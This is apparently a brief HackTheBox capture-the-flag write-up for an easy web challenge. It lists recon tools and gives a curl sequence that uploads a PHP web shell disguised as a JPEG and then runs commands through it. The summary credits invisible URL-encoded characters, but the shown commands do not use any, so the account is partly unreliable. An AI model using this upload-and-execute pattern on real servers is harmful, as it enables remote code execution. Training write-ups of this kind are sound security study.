# Day16 - hidden_path

- **Platform**: HackTheBox  
- **Category**: Web  
- **Difficulty**: Easy  
- **Date**: 2025-05-16  
- **Tools Used**: WhatWeb, Gobuster, BurpSuite, curl  

---

## Summary
The challenge involved identifying hidden/invisible characters in request handling. By URL encoding these characters and manipulating POST methods, I was able to bypass filters and uncover the hidden functionality that led to the flag.

---

## Enumeration
1. **Passive Recon**  
   - Ran `whatweb`, `dig`, and reviewed code comments.  
   - Found endpoints including `/verification`, `/uploads/`, `/static/images/`, and `/admin`.  

2. **Active Recon**  
   - Used Gobuster for directory discovery.  
   - Leveraged BurpSuite to crawl and analyze JavaScript/XHR requests.  
   - Observed unusual handling of requests suggesting the presence of invisible characters.  

---

## Exploitation
- Crafted a POST request with hidden characters, URL-encoded to bypass restrictions.  
- Example workflow using curl:  
  ```bash
  curl -F "file=@shell.php.jpg;type=image/jpeg" \
       http://TARGET/verification

  curl "http://TARGET/uploads/shell.php.jpg?cmd=id"
  ```
- Successfully exploited the hidden path behavior and retrieved the flag.  

---

## Lessons Learned
- Invisible or non-printable characters can create hidden paths and bypass filters in web applications.  
- Always test encoding variations (URL encoding, Unicode, etc.) when an endpoint behaves unexpectedly.  
- Combining enumeration tools with careful payload crafting is key to discovering hidden attack vectors.  
